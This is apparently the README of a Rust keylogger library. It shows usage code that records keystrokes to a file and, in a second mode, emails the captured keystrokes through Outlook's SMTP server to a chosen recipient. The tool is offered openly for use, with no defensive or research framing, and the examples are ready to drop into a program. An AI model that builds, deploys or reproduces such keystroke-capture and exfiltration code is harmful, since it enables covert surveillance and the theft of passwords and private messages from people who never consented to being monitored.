# Keylogger in Rust

## Getting Started
The Rust Keylogger depends on two objecs, the `Keylogger` struct, and the `Method` enum; which is used to define how to handle a buffer; the buffer being the collected keys that when the max capacity is hit, the keys are then passed onto the handle function from the `Handle` trait.

## Examples
Initializing a keylogger to write the keystrokes onto a file
```rust
use std::io::Result;
use keylogger::{
    Keylogger,
    Method
};

fn main() -> Result<()> {
    let mut keylogger = Keylogger::new(
        Method::File {path : "path/to/log.txt"}
    );
    keylogger.start()?;
    Ok(())
}
```

Initializing a keylogger to send the keystrokes through email; keep in mind that the email **MUST** be an **outlook** email, since the server being used is *smtp-mail.outlook.com*

```rust
use std::io::Result;
use keylogger::{
    Keylogger,
    Method
};

fn main() -> Result<()> {
    let mut keylogger = Keylogger::new(
        Method::Email {
                email : "your_email@outlook.com",
             password : "your_outlook_password",
            recipient : "email_to_send_the_keystrokes_to@example.com"
        }
    );
    keylogger.start()?;
    Ok(())
}
```
